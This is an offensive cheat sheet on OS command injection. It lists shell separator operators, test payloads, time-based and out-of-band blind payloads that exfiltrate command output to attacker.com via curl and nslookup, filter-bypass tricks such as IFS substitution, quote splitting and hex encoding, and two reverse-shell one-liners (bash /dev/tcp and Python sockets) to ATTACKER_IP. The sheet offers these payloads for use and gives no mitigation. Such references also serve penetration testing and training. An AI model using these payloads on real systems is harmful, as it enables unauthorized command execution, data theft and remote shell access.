# Command Injections

OS command injection occurs when user input is passed unsanitized to a shell function. Leads to arbitrary command execution on the server.

## Injection Operators

| Operator | Behavior |
|----------|----------|
| `;` | Run second command regardless of first result |
| `\|` | Pipe stdout of first to second |
| `\|\|` | Run second only if first fails |
| `&&` | Run second only if first succeeds |
| `\n` `%0a` | Newline — often treated as command separator |
| `` `cmd` `` | Command substitution |
| `$(cmd)` | Command substitution |

## Basic Payloads

```bash
# Test injection
; id
| id
&& id
`id`
$(id)

# Blind injection (time-based)
; sleep 5
| sleep 5
$(sleep 5)

# Blind injection (OOB)
; curl http://attacker.com/$(id)
; nslookup $(id).attacker.com
```

## Filter Bypass

```bash
# Space bypass
${IFS}                   # Internal Field Separator
{ls,-la}                 # No spaces needed
cmd<tab>arg              # Tab as separator

# Slash bypass
${PATH:0:1}              # Equals /

# Blacklist bypass
w'h'o'a'm'i             # Broken by quotes → whoami
w"h"o"a"m"i             # Same with double quotes

# Encoding
$(printf '\x77\x68\x6f\x61\x6d\x69')   # hex → whoami

# Case (Windows)
wHoAmI
```

## Reverse Shell via Injection

```bash
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
